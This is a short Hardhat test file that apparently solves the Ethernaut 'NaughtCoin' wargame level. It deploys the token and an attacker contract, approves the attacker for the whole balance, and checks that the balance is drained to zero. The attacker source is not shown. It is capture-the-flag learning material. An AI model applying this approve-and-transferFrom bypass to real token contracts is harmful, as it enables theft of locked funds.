import { loadFixture, ethers, expect } from "./setup";

describe("NaughtCoin", function() {

    async function deploy() {
        const signer = (await ethers.getSigners())[0];

        const factory = await ethers.getContractFactory("NaughtCoin");
        const contract = await factory.deploy(signer);
        
        const attackerFactory = await ethers.getContractFactory("NaughtCoinAttacker");
        const attacker = await attackerFactory.deploy(contract.target);

        await contract.waitForDeployment();

        return { contract, attacker, signer }
    }

    it("Solve the challenge", async function() {
        let tx;
        const { contract, attacker, signer } = await loadFixture(deploy);

        expect(contract.target).to.be.properAddress;

        let balance = await contract.balanceOf(signer.address);
        
        tx = await contract.approve(attacker.target, balance);
        await tx.wait();

        tx = await attacker.attack(contract.target, balance);
        await tx.wait();
        
        balance = await contract.balanceOf(signer.address);

        expect(balance).to.be.equal(0);
    });

});